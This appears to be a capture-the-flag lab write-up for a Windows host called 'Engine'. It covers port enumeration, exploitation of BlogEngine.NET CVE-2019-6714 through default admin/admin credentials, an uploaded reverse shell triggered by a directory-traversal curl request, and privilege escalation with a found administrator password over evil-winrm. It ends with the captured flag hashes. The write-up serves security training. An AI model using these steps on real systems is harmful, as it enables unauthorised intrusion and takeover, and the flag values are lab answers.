# Engine

**IP Address:** 172.31.1.16

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3389/tcp | open | ms-wbt-server |   |
| 445/tcp | open | microsoft-ds | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds  |
| 49154/tcp | open | msrpc | Microsoft Windows RPC  |
| 49155/tcp | open | msrpc | Microsoft Windows RPC  |
| 49164/tcp | open | msrpc | Microsoft Windows RPC  |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 80/tcp | open | http | Microsoft IIS httpd 8.5 |
| 123/udp | open|filtered | ntp |   |
| 135/udp | open|filtered | msrpc |   |
| 137/udp | open | netbios-ns | Microsoft Windows netbios-ns  |
| 138/udp | open|filtered | netbios-dgm |   |
| 139/udp | open|filtered | netbios-ssn |   |
| 1434/udp | open|filtered | ms-sql-m |   |
| 161/udp | open|filtered | snmp |   |
| 162/udp | open|filtered | snmptrap |   |
| 1900/udp | open|filtered | upnp |   |
| 445/udp | open|filtered | microsoft-ds |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 49152/udp | open|filtered | unknown |   |
| 500/udp | open|filtered | isakmp |   |
| 514/udp | open|filtered | syslog |   |
| 520/udp | open|filtered | route |   |
| 53/udp | open|filtered | domain |   |
| 631/udp | open|filtered | ipp |   |
| 67/udp | open|filtered | dhcps |   |
| 68/udp | open|filtered | dhcpc |   |
| 69/udp | open|filtered | tftp |   |

## Exploitation
### Exploit Details (SearchSploit)
* **Name** - BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution 
* **CVE** - 2019-6714
* **Module** - aspx/webapps/46353.cs
* **Disclosed** - 2019-02-12 
* **References**
  * https://www.exploit-db.com/exploits/46353
  * https://nvd.nist.gov/vuln/detail/CVE-2019-6714

1. Login to the blog with default credentials admin / admin. Then navigate to the content menu and select a post to enter edit mode. Then click on the file button. 

![Execute Exploit](images/exploit1.png)

2. Upload the code from the exploit after subsituting the correct IP Address / port values. 

![Execute Exploit](images/exploit2.png)

3. Initiate the reverse shell. 

Commands
```
curl 'http://172.31.1.16/blog//?theme=../../App_Data/files'
```

![Execute Exploit](images/exploit3.png)

4. Catch the reverse shell. 

Commands
```
whoami
```

![Execute Exploit](images/exploit4.png)

## Privilege Escalation
### Exploit Details (Found Credentials)
* **Name** - Found Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

winPEAS shows some saved credentials for the administator account.  

Commands
```bash
evil-winrm -i $ip -u administrator -p PzCEKhvj6gQMk7kA
whoami
type C:\Users\alex\Desktop\access.txt
type ..\Desktop\system.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
access.txt
150688cfd5d47037eda7a9bb589c8743
system.txt
d345d4ac0d810fcfb63b8be2b7e3bb71
```